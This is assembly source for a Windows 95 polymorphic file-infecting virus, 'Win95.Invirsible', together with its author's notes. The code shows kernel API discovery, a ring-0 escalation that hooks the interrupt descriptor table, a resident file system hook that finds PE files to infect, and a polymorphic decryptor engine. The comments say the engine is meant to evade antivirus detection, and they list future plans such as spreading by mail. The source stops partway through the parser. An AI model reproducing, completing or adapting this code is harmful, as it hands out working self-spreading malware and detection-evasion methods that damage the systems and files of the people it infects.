; Win95.Invirsible
; Bhunji
;
; proudly presents ;)
;
; Invirsible
;
; Virusinfo
; Version               2
; Size:                 Big, usually around 7.6k
; Infects:              PE files
; Resident:             Yes
; Systems;              Win9x
; Polymorhic:           Yes

; This is the second version on Invirsible. My goal with this virus
; is to make it as hard as possible to detect. It has one technique
; never seen in a virus before which I call the Guide technique. More
; info about this can be found at www.shadowvx.org. It carries a very
; advanced generic polymorpher. It is able to polymorph mov, add, sub
; so far but its trivial to add more instructions. The engine uses
; emulation to generate code. It is able to emulate memory and registers
; which results in code that looks very real. Coding new code to be
; polymorphed is pretty easy as it's similar to Intel asm.

; ex. mov RX1,[RX2]
; mov Random register 1, [Random register 2]

; Changes since last version
; A total rewrite of the polymorphic code. Works way better now.
; *  Changed the polymorphic language to be more similar to Intel asm
; *  Added memory emulation, the created code uses the end of .data segment.
; *  Deleted advanced register emulation, did hardly create better code
;    and was taking up lots of space.
; *  Very generic, adding a new instruction needs 10 lines of data/code
;    instead of 200-400 lines.
; *  An optimiser that deletes the very worst code. (fx. mov eax,eax)
; *  The linked list polymorpher will create a six different looking
;    decryptors for the generic polymorpher.


; Some changes to the virus
; *  Bugfixes. (Doesn't crash on infection :) )
; *  Search for slackspace in .data segment. This space is used by the
;    generated code to look more like real code.
; *  Recompilation of the code before every infection to make the pointers
;    point to the .data slack

; Things to be added in the future.
; *  More instructions will be added to the polymorpher
; *  A more powerful optimiser
; *  Infect on NT too.
; *  Spreading by mail
; *  Infection of hlp files
; *  EPO
; *  Deregister the most common AV software on file but register it later in
;    memory. This will not happen if the AV gives the virus its proper name.
; *  A better method of upgrading the virus ala babylonia.

; And here is an example of what code the engine is able and has been
; able to generate.

; Version 1
; Version one is able to emulate/generate
; add, mov
s
; (code is taken from a generated Guide)

; mov     ecx, 0Ch
; mov     ebx, fs:[ecx]                         ; get random number
; mov     edx, 0
; add     edx, eax
; add     eax, esi
; mov     edi, 0
; add     edi, 6472DAADh
; mov     eax, 5A97451Fh
; mov     eax, edx
; add     edi, ecx
; mov     ecx, 0
; add     ecx, ebx
; or      ecx, 8
; xor     ebx, ecx                              ; 'and' ebx,8
; add     edi, 0DCA7B4AAh
; add     edi, 60E4CB5Ch
; mov     edi, ebx
; add     ebx, offset jumptable                 ; add ebx, offset jumptable
; jmp     dword ptr [ebx]


; patterns

; Differences from the trash code
; fs:[register]
; or/and register,8
; jmp [register]

; The trashcode
; very few instructions
; no memory instructions
; the same amount of every emulateable instruction (normal code has more
; movs then adds for example)
; unnecessary instructions. Ex.
; mov     eax, 5A97451Fh        ; this is unnessesary
; mov     eax, edx              ; as this overwrites eax again


; Version 2
; Version two is able to emulate
; add, sub, mov, and, or, xor and memory

; Generates on average more movs then the
; adds and more adds then the other opcodes.
; Generates more registers then memory operands and
; more memory operands then numbers.
; The end result 'feels' more like regular code.
; Many many bugfixes. (There are no more bugs i hope)

; Code is taken from a generated decryptor
;
; mov     edx, 8D403766h
; xor     [4030D7], 1A45h               ; 1a45 = virussize
; xor     esi, [4030CF]
; mov     [4030CF], ecx
; mov     esi, 45BBA054h
; add     edi, 0CCFC6B5Bh
; mov     ebx, 1A45h                    ; first "real" instruction
; mov     eax, [4030CF]
; sub     edi, 1A45h
; or      eax, ebx
; mov     edi, 1A45h
; mov     edi, 3
; add     ecx, 3
; mov     edx, [4030BF]                 ; second
; add     [4030D7], eax
; mov     esi, 3

; DecryptLoop:
; pusha                                 ; will be deleted in future versions
; mov     eax, 1FF5893Dh
; mov     ecx, ebx
; sub     eax, 0E138ABECh
; add     edx, ecx                      ; third
; mov     esi, ecx
; mov     edi, ebx
; mov     eax, 0D6E7BEF5h
; mov     [4030CF], 5493B89Ch
; sub     ecx, [4030B3]
; mov     eax, 0E138ABECh
; and     [4030D3], ecx
; or      eax, ebx
; xor     [edx], 0E138ABECh             ; decrypt code
; mov     [4030D7], 0E138ABECh
; popa
; sub     ebx, 4                        ;
; jnb     DecryptLoop
; mov     dword_0_4030CF, 69472C81h
; mov     ecx, 0F5D970C4h
; mov     edi, 1
; mov     eax, dword_0_4030B7
; add     ecx, 8244076Eh




; If we put the real code pieces together we get.
;
; mov     ebx, 1A45h                    ; VirusSize
; mov     edx, [4030BF]                 ; Where to start decrypt
; DecryptLoop:
; add     edx, ecx                      ; third
; xor     dword ptr [edx], 0E138ABECh   ; decrypt code
; sub     ebx, 4                        ;
; jnb     DecryptLoop

; The third instruction should add "Where to start" with "VirusSize" but
; as you can see it is added with ecx instead, this is because of the
; emulation. The engine knows that ecx = ebx = VirusSize so it used ecx
; instead.

; patterns

; Differences from the trash code
; pushad/popad                  ; easy to delete
; [Register]                    ; engine is only able to create [Number]
; jxx                           ; Engine isnt able to create jumps yet

; The trashcode
; Still to few instructions, needs push/pop, call, jmp, jxx to look at least
; something like real code.
; Memory instructions isn't able to create memory pointers with a register
; inside, eg [Number+register]. A better compiler will fix this.
; Still unnecessary instructions. Ex.
; mov     eax, 0D6E7BEF5h       ; this is unnessesary
; ...
; mov     eax, 1FF5893Dh        ; as this overwrites eax again
;
; Greetings
; (M)asmodeus.	Dropper.exe has generated errors and will be closed by
;               Windows :)))
; Morphi        Hoppas att du f†r det b„ttre i helsingborg
; Prizzy        Thanks for helping me with the bug
; Ruzz          Yes, i have FINALY finished it :)
; Kamaileon.    I wish you luck with the windows programming.
; Clau		Hello sister ;)
; Urgo32        Good luck with your next virus.




includelib kernel32.lib
includelib user32.lib
include c:masmincludewindows.inc


.486
.model flat, stdcall

ExitProcess     PROTO   ,:DWORD
MessageBoxA     PROTO   ,:DWORD,:DWORD,:DWORD,:DWORD


; Primes, used them in the first version for advanced register emulation,
; might be usefull in the future

Prime1                  equ     2
Prime2                  equ     3
Prime3                  equ     5
Prime4                  equ     7
Prime5                  equ     11
Prime6                  equ     13
Prime7                  equ     17
Prime8                  equ     19
Prime9                  equ     23
Prime10                 equ     29
Prime11                 equ     31
Prime12                 equ     37
Prime13                 equ     41
Prime14                 equ     43
Prime15                 equ     47
Prime16                 equ     53
Prime17                 equ     59
Prime18                 equ     61
Prime19                 equ     67
Prime20                 equ     71
Prime21                 equ     73
Prime22                 equ     77


.data
VirusStr        db      "No crack found",0

.code
   ProgramMain:

        push    0
        call    ExitProcess

_rsrc segment para public 'DATA' use32
assume cs:_rsrc


  VirusStart:
  Main:
        mov     ebx,[esp]

        push    ebp
        call    GetDelta

     GetDelta:
        pop     ebp
        sub     ebp,offset GetDelta             ; address

        mov     [Temp+ebp],ebx                  ; save offset into kernel

        .if     ebp!=0                          ; code that isn't
                                                ; executed in the first
                                                ; version

        mov     eax,[eax]                       ; polymorphic code will
        mov     [InfectedProgramOffset+ebp],eax ; move pointer to
        .endif                                  ; programstart in eax

        lea     eax,BreakPoint1
        lea     eax,[ebp+GetDelta]              ; move some address to
        mov     [PointerToDataSlack+ebp],eax    ; PTDS, doesnt matter as
                                                ; long as its a working one

        ; mov eax,fs:[0c]
        db      67h,64h,0a1h,0ch,00h            ; get random number
        add     [RandomNumber+ebp],eax          ; (is not random on NT)

        call    GetAPIFunctions                 ; Get needed API functions

        call    FixTables                       ; clean the 'dirty' tables
                                                ; and allocate mem for the
                                                ; polymorpher

        call    CreateGuideAndDecryptor         ; Generate the polymorphic
                                                ; code

        call    GetResident                     ; intercept IFSMgr to get
                                                ; filenames to infect


    ReturnToHost:

        push    [MemPtr+ebp]                    ; free allocated mem used
        call    [LocalFree+ebp]                 ; by polymorpher

        mov     eax,[InfectedProgramOffset+ebp] ; program address
        pop     ebp                             ; restore ebp

        jmp     eax                             ; jmp to program

Topic   db      "You can not find what you can not see.",0
        db      "Invirsible by Bhunji (Shadow VX)",0

        VSize                   equ     VirusEnd-VirusStart
        VirusSize               equ     VSize



; how much stack and mem should the polymorpher use

        NumberOfOffsets         equ     10      ; more size = better code
                                                ; (doesnt matter right now
                                                ; because the engine isnt
                                                ; able to create jumps)
        StackSize               equ     100     ; (doesnt matter right now
                                                ; because the engine isnt
                                                ; able to emulate the stack)

        MemorySize              equ     10      ; The more size the better
                                                ; code is produced but makes
                                                ; it harder to find a file to
                                                ; infect


        LinesOfTrash            equ     3       ; LinesOfTrash is the
                                                ; aproximate numbers of
                                                ; random instructions between
                                                ; every "legal" instruction

                                                ; LinesOfTrash
                                                ; Fixup instruction
                                                ; LinesOfTrash

        EndValueFrecuency       equ     1       ; the higher the more often
                                                ; is the EndValue chosed
                                                ; the higher the number is
                                                ; the harder is it to detect
                                                ; my looking at one
                                                ; instruction, but its easier
                                                ; to detect by looking at many
                                                ; instructions.
                                                ; 1 is a perfect value

        MemPtr                  dd      0       ; ptr to allocated mem
        ReturnAddress           dd      0       ; stores the return address
                                                ; in some functions


        InfectedProgramOffset   dd      ProgramMain     ; where to jump when
                                                ; done

        Temp                    dd      0       ; just a temporary variable

                                                ; API's the virus uses
   WinFunctions:
        lstrlenStr              db      "lstrlen",0
        LocalAllocStr           db      "LocalAlloc",0
        LocalFreeStr            db      "LocalFree",0
                                db      0
                                                ; pointers to these
   Functions:
        lstrlen                 dd      ?
        AllocMem                dd      ?
        LocalFree               dd      ?







FixTables:




        lea     edi,[ZeroRegStart+ebp]
        mov     ecx,(ZeroRegEnd-ZeroRegStart)/4
        xor     eax,eax
        rep     stosd

        lea     edi,[RandomRegs+ebp]
        mov     ecx,Registers
        dec     eax
        rep     stosd

        lea     edi,[SavedOffsets+ebp]
        mov     ecx,NumberOfOffsets
        rep     stosd


        lea     eax,[EaxTable+ebp]
        mov     [Tables+ebp],eax

        mov     eax,MemorySize*20+StackSize*20

        push    eax
        push    LMEM_FIXED + LMEM_ZEROINIT
        call    [AllocMem+ebp]
        mov     [Tables+ebp+4],eax

        add     eax,MemorySize*20
        mov     [Tables+ebp+8],eax


        call    UndefineRegistersAndMem

        xor     eax,eax
        lea     esi,[Mem1Table+ebp]
        mov     edi,[Tables+ebp+4]
        lodsb


        mov     ecx,eax
     PredefinedMem:
        lodsb
        push    edi
        imul    eax,eax,20
        lea     edi,[edi+eax]
        push    ecx
        mov     ecx,5
        rep     movsd
        pop     ecx
        pop     edi
        loop    PredefinedMem

        ret





UndefineRegistersAndMem:
        lea     edi,[EaxTable+ebp+4*4]
        mov     ecx,Registers
        mov     eax,Writeable+Undefined

     SetOpcodeInfo1:
        stosd
        add     edi,4*4
        loop    SetOpcodeInfo1


        mov     edi,[Tables+ebp+4]
        add     edi,4*4
        mov     ecx,MemorySize+StackSize
        mov     eax,Writeable+Undefined

     SetOpcodeInfo2:
        stosd
        add     edi,4*4
        loop    SetOpcodeInfo2



        ret



















        GetModuleHandle         dd      0
        GetProcAddress          dd      0
        GetProcAddressStr       db      "GetProcAddress",0

GetAPIFunctions:
        mov     eax,[Temp+ebp]

        call    GetModuleHandleAndProcAddress

        mov     [GetModuleHandle+ebp],eax
        mov     [GetProcAddress+ebp],ebx

        xor     edx,edx
        lea     edx,[WinFunctions+ebp]
        xor     ecx,ecx

  CopyWinApiFunctions:
        push    edx
        push    ecx

        push    edx
        push    edx
        push    [GetModuleHandle+ebp]
        call    [GetProcAddress+ebp]

        mov     ecx,[esp+4]
        mov     [Functions+ebp+ecx],eax

        call    [lstrlen+ebp]
        pop     ecx
        pop     edx
        add     edx,eax
        add     ecx,4
        inc     edx

        cmp     byte ptr [edx],0
        jnz     CopyWinApiFunctions
NoMoreApis:
        ret

; Input
; eax = somewhere in kernel

; Returns
; eax = GetModuleHandler offset
; ebx = GetProcAddress offset

GetModuleHandleAndProcAddress:
        and     eax,0fffff000h                  ; even 1000h something

   FindKernelEntry:
        sub     eax,1000h
        cmp     word ptr [eax],'ZM'
        jnz     FindKernelEntry


        mov     ebx,[eax+3ch]

        cmp     word ptr [ebx+eax], 'EP'
        jne     FindKernelEntry
        mov     ebx,[eax+120+ebx]
        add     ebx,eax                         ; ebx -> Export table

        mov     ecx,[ebx+12]                    ; ecx -> dll name

        cmp     dword ptr [ecx+eax],'NREK'
        jz      FindGetProcAddress
        jmp     FindKernelEntry


; We can now be sure that eax points to the kernel
    FindGetProcAddress:
        lea     edi,[GetProcAddressStr+ebp]

        mov     edx,[ebx+32]

     FindFunction:
        add     edx,4
        mov     ecx,15                           ; length of GetProcAddress,0
        mov     esi,[edx+eax]
        push    edi
        add     esi,eax
        repz    cmpsb
        pop     edi
        jne     FindFunction

        sub     edx,[ebx+32]
        shr     edx,1                           ; ecx = ordinal pointer

        lea     esi,[edx+eax]
        xor     ecx,ecx
        add     esi,[ebx+36]                    ; esi = base+ordinals+ordnr

        mov     cx,word ptr [esi]               ; ecx = ordinal
        shl     ecx,2                           ; ecx = ordinal*4
        add     ecx,[ebx+28]                  ; ecx = ordinal*4+func tbl addr

        mov     ebx,[ecx+eax]                   ; esi = function addr in file
        add     ebx,eax                         ; esi = function addr in mem

        ret




























Encryptor               dd      0

GetResident:
        mov     eax,[GetModuleHandle+ebp]
        add     eax,6ch
        mov     ebx,'.K3Y'
        cmp     [eax],ebx

        jz      DontGoRing0

        sub     esp,8
        sidt    [esp]                           ; get interupt table


; hook int 3 to get get ring 0
        mov     esi,[esp+2]
        add     esi, 3*8                        ; pointer to int 3
        mov     ebx, [esi+4]

        mov     bx,word ptr [esi]               ; ebx = old pointer
        lea     eax,[Ring0Code+ebp]             ; eax = new pointer
        mov     word ptr [esi],ax               ; move new pointer to int 3
        shr     eax,16
        mov     word ptr [esi+6], ax

        pushad

        int     3                               ; get into ring 0
        popad
        mov     [esi],bx                        ; return old pointer again
        shr     ebx,16
        mov     [esi+6],bx
        add     esp,8

   DontGoRing0:
        ret




; ---------------------------------------
; -------------------------------- Ring 0
; ---------------------------------------


Ring0Code:
        mov     eax,[GetModuleHandle+ebp]
        add     eax,6ch
        mov     ebx,'.K3Y'
        mov     [eax],ebx
        mov     ebx,[eax+8]
        mov     [eax+4],ebx

        mov     eax,[MemoryTable+ebp]
        sub     eax,[GuidePos+ebp]
        push    eax

        add     eax,(MemorySize+1)*8
        push    eax                             ; push guide + decrypt size
                                                ; + special variables
        add     eax,(VirusEnd-VirusStart)*2+20

; allocate mem
        push    eax
        push    R0_AllocMem
        mov     edi,ebp
        call    vxd
        pop     ecx
        test    eax,eax
        jz      ErrorRing0

; Copy guide and decryptor to ring 0 mem

        pop     ecx                             ; ecx = guide + decrypt size
                                                ; + special variables
        mov     esi,[GuidePos+ebp]
        mov     edi,eax
        mov     ebx,eax
        xchg    ebx,[GuidePos+ebp]              ; eax = new guide pos
                                                ; ebx = old guide pos
        pop     edx                             ; edx = size of guide+decrypt
        add     edx,eax                         ; edx = new memory pos
        mov     [MemoryTable+ebp],edx

        sub     eax,ebx                         ; difference in mem
        add     [DecryptorPos+ebp],eax          ; add to get new pos




        rep     movsb                           ; copy polycode to ring 0

        mov     edi,edx
        mov     ecx,(MemorySize+1)*(8/4)
        xor     eax,eax
        rep     stosd

        add     edx,MemorySize*4+4
        mov     [VirtualDataSegment+ebp],edx

        pushad


        mov     eax,[VirtualDataSegment+ebp]    ; pointer to virtual data
                                                ; segment

        lea     edx,[Mem1Table+ebp]
        movzx   ecx,byte ptr [edx]              ; how much data does the
                                                ; decryptor and guide need
                                                ; predefined
        inc     edx

     CopyDataToVirtualDataSegment:
        movzx   ebx,byte ptr [edx]              ; where in datasegment should
                                                ; we write the data
        shl     ebx,2
        push    dword ptr [edx+1]               ; push the data to write
        pop     [eax+ebx]                       ; write it to virtual data seg
        add     edx,1+5*4                       ; point to next data block
        loop    CopyDataToVirtualDataSegment

        popad

        mov     [VirusInRing0Mem+ebp],edi
        mov     ebx,edi

        lea     esi, [ebp+VirusStart]
        mov     ecx, VirusSize
        rep     movsb                           ; copy virus to ring 0
        xor     eax,eax

        stosd
        stosd

; encrypt virus in memory
        pushad
        mov     esi,[Encryptor+ebp]
        push    ebx                             ; pointer to virus in ring0
        mov     eax,esp
        push    eax                             ; pointer to pointer
        push    eax
        push    eax
        push    eax
        mov     [PointerToDataSlack+ebp],esp    ; all special variables
                                                ; points to pointer to
                                                ; virus in ring 0
        call    Compile

        call    esi

        add     esp,5*4

        popad

; copy residentcode to mem
        push    edi

        lea     esi, [ebp+ResidentcodeStart]
        mov     ecx, ResidentcodeEnd-ResidentcodeStart
        rep     movsb





; hook API function
                                                ; edi is on stack
        push    InstallFileSystemAPIhook
        mov     edi,ebp
        call    vxd


        pop     edi                             ; 0 edi left on stack
        sub     edi,ResidentcodeStart
        mov     [edi+BasePtr+1],edi
        mov     [edi+OldAPIFunction],eax
BreakPoint1:

        lea     eax,[edi+BreakPoint]
        lea     eax,[edi+BreakPoint]
        iretd

ErrorRing0:
        pop     eax
        xor     eax,eax
        iretd



















CreateGuideAndDecryptor:
        push    1024*1024
        push    LMEM_FIXED + LMEM_ZEROINIT
        call    [AllocMem+ebp]

        mov     [MemPtr+ebp],eax






        mov     edi,eax
        lea     esi,[Guide+ebp]

        call    LinkedListPolymorpher
        call    Polymorph                       ; create Guide

        mov     [GuidePos+ebp],esi
        mov     [GuideSize+ebp],eax

        add     edi,32

        lea     esi,[Decryptor+ebp]

        call    LinkedListPolymorpher
        push    esi

        call    Polymorph                       ; create Decryptor

        mov     [DecryptorPos+ebp],esi
        mov     [MemoryTable+ebp],edi

        mov     [DecryptorSize+ebp],eax


        call    UndefineRegistersAndMem

        mov     [HowMuchTrash+ebp],0
        pop     esi

        pushad
        mov     edi,esi
        mov     eax,Op_trash
        bswap   eax
        xor     ecx,ecx
        xor     edx,edx
     FindTrashInstruction:
        inc     edi
        cmp     [edi],edx
        jz      EndOfTrashInstructions
        xor     ecx,ecx
        cmp     [edi],eax
        jnz     FindTrashInstruction
        add     edi,4
        push    eax
        xor     eax,eax
        stosb
        pop     eax
        jmp     FindTrashInstruction

     EndOfTrashInstructions:
        test    ecx,ecx
        jnz     ReallyEnd
        inc     ecx
        add     edi,3
        jmp     FindTrashInstruction

     ReallyEnd:
        popad
        add     edi,eax
        call    MutateCode                      ; Generic polymorphing

        mov     ecx,edi
        sub     ecx,esi
        shr     ecx,1
        mov     edi,esi

    FindDecryptInstruction:
        mov     eax,'R['
        repnz   scasw                           ; find [R
        inc     edi
        mov     ax,word ptr [edi]
        cmp     eax,',]'                        ; is this [Rx],
        jnz     FindDecryptInstruction          ; if not, continue looking

        and     edi,0fffffff0h
        mov     eax,[edi]
        bswap   eax

        .if     eax==Op_xor
                jmp     CompileEncryptor

        .elseif eax==Op_add
                mov     eax,Op_sub
                bswap   eax
                stosd
                jmp     CompileEncryptor
        .else
                mov     eax,Op_add
                bswap   eax
                stosd
                jmp     CompileEncryptor
        .endif


    CompileEncryptor:
        mov     [Encryptor+ebp],esi





        ret




; ---------------------------------------------------
; --------------------------- The generic polymorpher
; ---------------------------------------------------

; esi = Data to polymorph
; edi = where to put the created data

; Returns
; esi = start of created data
; edi = end of created data/start of created code
; eax = size of the created code

; Defined opcode looks
Op_add          equ     'add '
Op_and          equ     'and '
Op_mov          equ     'mov '
Op_or           equ     'or  '
Op_sub          equ     'sub '
Op_xor          equ     'xor '


Op_cmp          equ     'cmp '
Op_jnz          equ     'jnz '
Op_jnb          equ     'jnb '
Op_jna          equ     'jna '
Op_jmp          equ     'jmp '

Op_offset       equ     'ofs '
Op_db           equ     'db  '                  ; output whats in there,
                                                ; dont polymorph,
                                                ; dont compile

Op_dontparse    equ     '!emu'                  ; dont polymorph only
                                                ; compile


; special opcodes
Op_encrypt      equ     'cpt '                  ; encrypt this operand,
                                                ; used to create encryptor/
                                                ; decryptor

Op_setinfo      equ     'nfo '                  ; set info of operand
                                                ; used to define a operand
                                                ; changable or similar.
Op_prefix       equ     'pfx '                  ; prefix, eg fs:, es: and
                                                ; similar. Will be deleted
                                                ; in future versions

Op_trash        equ     'trsh'                  ; how mush trash to be
                                                ; produced, use wisely
                                                ; to make your code better
                                                ; or when you need to save
                                                ; the flags





LinkedListPolymorpher:
        call    TablePolymorpher                 ; 'old' style polymorphics

; esi -> created data
; edi -> created data+sizeof (created data)+1
        ret

Polymorph:
        add     edi,16
        and     edi,0fffffff0h
        push    edi
        push    edi

        call    MutateCode                      ; Generic polymorphing
        pop     edi
; esi -> created data
        call    Optimize                        ; Optimize the created code

; esi -> created data
; edi -> created data+sizeof (created data)+1
        push    edi

        call    Compile                         ; compile the code to get
                                                ; the size

        pop     edi
        pop     esi
        ret




Regs                    equ     6
Registers               equ     Regs
InfoPtr                 equ     16





; This polymorher is a bit different from the usuall one.
; It's able to create code that does different things, not just
; the same with a different look.




TablePolymorpher:
        ; A nice recursive function :)
        xor     eax,eax
        xor     ecx,ecx
        push    edi
        push    0
    ReadInstruction:                            ; 'execute' function
        mov     cl, byte ptr [esi]              ; How many bytes to output
        inc     esi
        rep     movsb

 ParseCall:                                     ; end of this function,
                                                ; should we call an other
        lodsb
        test    eax,eax
        jz      ReturnFromCall                  ; no, return


        lea     ebx,[esi+eax*4]
        push    ebx                             ; push return address

        call    Random
        mov     esi,[esi+eax*4]                 ; address of the function
        add     esi,ebp
        jmp     ReadInstruction                 ; jmp to function 'executer'

     ReturnFromCall:
        pop     esi                             ; return from main function
        test    esi,esi
        jnz     ParseCall

     NoMoreParsing:
        xor     eax,eax
        stosd
        stosd

        pop     esi
        ret

  Decryptor:
                db      0

                db      1
                dd      R0VSize
;                dd      R0Zero

                db      1
                dd      MovePoinerToProgramStart



                db      0

        MovePoinerToProgramStart:
                db      MovePoinerToProgramStartEnd-$-1
                db      "trsh",LinesOfTrash

                db      "mov R1,[N"
                dd      1
                db      "]"

        MovePoinerToProgramStartEnd:
                db      0


        R0VSize:
                db      R0VSizeEnd-$-1
                db      "mov RX0,N"
                dd      VSize
        R0VSizeEnd:

                db      2
                dd      R1VirusStart
                dd      R1VirusEnd

                db      1
                dd      EncryptRX1

                db      1
                dd      SubR0AndJump
                db      0

        SubR0AndJump:
                db      SubR0AndJumpEnd-$-1
                db      "db  ",1                ; Bytes not to be morphed
                popad

                db      "trsh",0
                db      "sub RX0,N"
                dd      4

                db      "!emu",9                ; dont do anything about this
                db      "jnb N"
                dd      0
        SubR0AndJumpEnd:
                db      0

        R0Zero:
                db      R0ZeroEnd-$-1
                db      "mov RX0,N"
                dd      0
        R0ZeroEnd:

                db      2
                dd      R1VirusStart
                dd      R1VirusEnd

                db      1
                dd      EncryptRX1

                db      1
                dd      AddR0AndJump
                db      0


        AddR0AndJump:
                db      AddR0AndJumpEnd-$-1

                db      "db  ",1                ; Bytes not to be morphed
                popad

                db      "add RX0,N"
                dd      4

                db      "trsh",0
                db      "!emu",13               ; dont do anything about this
                db      "cmp RX0,N"
                dd      VSize

                db      "!emu",9                ; dont do anything about this
                db      "jna N"
                dd      0

        AddR0AndJumpEnd:

                db      0



        R1VirusStart:
                db      R1VirusStartEnd-$-1
                db      "mov RX1,[N"
                dd      3
                db      "]"

                db      "ofs 0"

                db      "db  ",1
                pushad

                db      "nfo RX2"
                dd      Undefined

                db      "add RX1,RX0"

        R1VirusStartEnd:
                db      0



        R1VirusEnd:
                db      R1VirusEndEnd-$-1
                db      "mov RX1,[N"
                dd      3
                db      "]"

                db      "add RX1,N"
                dd      VSize

                db      "ofs 0"

                db      "db  ",1
                pushad

                db      "nfo RX2"
                dd      Undefined

                db      "sub RX1,RX0"
        R1VirusEndEnd:
                db      0


        EncryptRX1:
                db      0


                db      1
                dd      RandomReg
                db      0


        OpcodeXor:
                db      4
                db      "xor "
                db      0

        OpcodeAdd:
                db      4
                db      "add "
                db      0

        OpcodeSub:
                db      4
                db      "sub "
                db      0

        RandomReg:
                db      0
                db      1
                dd      RandomOpcode

                db      1
                dd      RandomizeMemWithReg
                db      0

        RandomizeMemWithReg:
                db      RandomizeMemWithRegEnd-$-1
                db      "[RX1],N"
RandomNumber    dd      0
        RandomizeMemWithRegEnd:
                db      0



        RandomOpcode:
                db      0
                db      3
                dd      OpcodeXor
                dd      OpcodeAdd
                dd      OpcodeSub
                db      0





Guide:
                db      DefinedTrash-$-1
                db      "trsh",LinesOfTrash
     DefinedTrash:

                db      1
;                dd      RandomEveryBoot
                dd      RandomEveryTime

                db      1
                dd      MakeZeroOrEight

                db      0


            RandomEveryTime:
                db      RandomEveryTimeEnd-$-1
                db      "pfx ",64h              ; prefix fs:

                db      "mov RX0,[N"
                dd      PointerToRandomMemory
                db      "]"                     ; mov X0, fs:[0ch]
            RandomEveryTimeEnd:
                db      0

            RandomEveryBoot:
                db      RandomEveryBootEnd-$-1
                db      "nfo R"
            RandomEveryBootEnd:
                db      3
                dd      RndEcx
                dd      RndEdi
                dd      RndEsi

                db      0

            RndEcx:
                db      RndEcxEnd-$-1
                db      "3"
                dd      Undefined
                db      "mov RX0,R3"
            RndEcxEnd:
                db      0


            RndEdi:
                db      RndEdiEnd-$-1
                db      "5"
                dd      Undefined
                db      "mov RX0,R5"
            RndEdiEnd:
                db      0

            RndEsi:
                db      RndEsiEnd-$-1
                db      "6"
                dd      Undefined
                db      "mov RX0,R6"
            RndEsiEnd:
                db      0

        MakeZeroOrEight:
                db      MakeZeroOrEight-$-1

                db      "and RX0,N"
                dd      8

                db      "add RX0,[N"            ; special variable 1 =
                dd      1                       ; pointer to jump table

                db      "]"
                db      "jmp [RX0]"             ; jmp [X0]
        MakeZeroOrEightEnd:
                db      0














































; ---------------------------------------------
; ---------------- MutateCode -----------------
; ---------------------------------------------
; ------------- Local variables

        Prefix                  dd      0

      EndWhere:
        Trash                   dd      0
        ToReg                   dd      0
        ToMemValue              dd      0
        ToMemReg                dd      0

      FromWhere:
        FromValue               dd      0
        FromReg                 dd      0
        FromMemValue            dd      0
        FromMemReg              dd      0

      TempWhere:
        TempValue               dd      0
        TempReg                 dd      0
        TestMemValue            dd      0
        TestMemReg              dd      0

        Temp1                   dd      0
        Temp2                   dd      0


Writeable                       equ     1b
Undefined                       equ    10b      ; is has a unknown value
Uninitialized                   equ    -1
TableSize                       equ     EbxTable-EaxTable

        EndValue                dd      0
        EndTypeOfValue          dd      0


   Tables:                                      ; pointers to the different
                                                ; tables
        RegTables               dd      EaxTable
        MemoryTables            dd      0       ; Is allocated later
        StackTables             dd      0       ; first table is EspTable

   EaxTable:
        EaxValueNumber          dd      0
        EaxValueReg             dd      0
        EaxMemoryNumber         dd      0
        EaxMemoryReg            dd      0
        EaxInformation          dd      Undefined+Writeable

   EbxTable:
        dd      0,0,0,0, Undefined+Writeable
   EcxTable:
        dd      0,0,0,0, Undefined+Writeable
   EdxTable:
        dd      0,0,0,0, Undefined+Writeable
   EsiTable:
        dd      0,0,0,0, Undefined+Writeable
   EdiTable:
        dd      0,0,0,0, Undefined+Writeable

   ; this table is copied to mem, its used to define
   ; starting values for the memory
   ; Undefined mem start as Undefined+Writeable (you could change this to
   ; only writable for slightly better code.)

   Mem1Table:
        db      4                               ; how many tables

        db      0                               ; which table
        dd      0,0,0,0, Undefined              ; program entry point

        db      1
        dd      0,0,0,0, Undefined              ; pointer to mem 0

        db      2
        dd      0,0,0,0, Undefined              ; decryptor entry point

        db      3
        dd      0,0,0,0, Undefined              ; where to start decrypt


   RandomRegs:
        dd      Registers dup (-1)              ; Random Regs




; mutates the code in esi and places the result in edi
; returns a pointer to the created code in esi
; returns a pointer to the created code + sizeof(created code) in edi
     MutateCode:
        push    edi

      MorphCodeLoop:
        xor     eax,eax
        dec     eax
        push    edi
        lea     edi,[ebp+EndWhere]
        mov     ecx,8
        rep     stosd
        pop     edi

        call    Parse
        jmp     MorphCodeLoop


  MutateEnd:
        pop     eax                             ; return address of Parse
        pop     esi
        add     esi,16
        and     esi,0fffffff0h
        add     edi,10
        ret






; ----------------------- Parser

ParseSpecialVariables:
        dd      (ParseSpecialVariablesEnd-ParseSpecialVariables-4)/4+1
        dd      Op_db, Op_encrypt, Op_setinfo, Op_offset, Op_prefix
        dd      Op_trash,Op_dontparse,Op_jmp
ParseSpecialVariablesEnd:

ParseSpecialProcedures:
        dd      ParseDeclareByte, ParseEncrypt, ParseChangeInfo
        dd      ParseSaveOffset, ParsePrefix, ParseTrash, ParseDontParse
        dd      TemporaryParseJump
ParseSpecialProceduresEnd:

ParseInstructionData:
        dd      (ParseInstructionDataEnd-ParseInstructionData-4)/4+1
        dd      Op_add, Op_mov, Op_sub, Op_or, Op_xor, Op_and
ParseInstructionDataEnd:





        AddPos                  equ     0
        MovPos                  equ     1
        SubPos                  equ     2
        OrPos                   equ     3
        XorPos                  equ     4
        AndPos                  equ     5


InstructionData:
AddInfo:
        dd      offset AddInstruction
        dd      Op_add

MovInfo:
        dd      offset MovInstruction
        dd      Op_mov

SubInfo:
        dd      offset SubInstruction
        dd      Op_sub

OrInfo:
        dd      offset OrInstruction
        dd      Op_or

XorInfo:
        dd      offset XorInstruction
        dd      Op_xor

AndInfo:
        dd      offset AndInstruction
        dd      Op_and




InstuctionTablesEnd:




Parse:
        push    edi
        mov     ecx,[ParseSpecialVariables+ebp]
        lea     edi,[ParseSpecialVariables+ebp+4]



        lodsd
        bswap   eax

        repnz   scasd
        test    ecx,ecx
        jz      ParseInstruction

        pop     edi
        lea     ebx,[ParseSpecialProceduresEnd+ebp]
        imul    ecx,ecx,4
        sub     ebx,ecx
        mov     ebx,[ebx]
        add     ebx,ebp
        jmp     ebx


     ParseDeclareByte:
        mov     edx,Op_db
        call    OutputOnlyOpcode
        xor     eax,eax
        lodsb
        mov     ecx,eax
        stosb                                   ; number of bytes to declare
        rep     movsb
        ret

     ParseEncrypt:
        call    GetOperand
        ret

     ParseChangeInfo:
        mov     eax,666666h
        call    GetOperand
        mov     ecx,eax
        lodsd
        xchg    eax,ecx
        call    ChangeInfo
        ret

     ParseSaveOffset:
        mov     edx,Op_offset
        call    OutputOnlyOpcode
        movsb
        ret

     ParsePrefix:
        xor     eax,eax
        lodsb
        mov     [Prefix+ebp],eax
        ret

